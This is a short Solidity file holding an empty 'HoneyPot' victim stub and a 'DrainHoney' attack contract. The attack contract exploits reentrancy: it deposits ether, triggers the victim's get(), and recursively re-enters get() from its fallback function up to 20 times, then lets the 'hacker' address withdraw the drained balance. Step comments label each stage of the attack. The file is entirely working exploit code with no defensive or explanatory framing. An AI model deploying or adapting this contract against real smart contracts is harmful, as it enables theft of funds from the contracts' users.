pragma solidity ^0.4.13;

contract HoneyPot {

  function HoneyPot() payable {}

  function put() payable {}

  function get() {}

  function() {}
}

contract DrainHoney {

  HoneyPot hp;
  uint public loop;
  address public hacker;

  function DrainHoney(address _contract) {
    hp = HoneyPot(_contract);
    hacker = msg.sender;
  }
  // step 1: send x ether first to victim contract
  function sendMoney() payable {
    hp.put.value(msg.value)();
  }
  // step 2: call get function to trigger re-entrance
  function get() {
    hp.get();
  }

  function withdraw() {
    require(msg.sender == hacker);
    msg.sender.transfer(this.balance);
  }

  function() payable {
     // earn 20x
     if (loop < 20) {
       loop++;
       hp.get();
     }
     loop = 0;
  }
}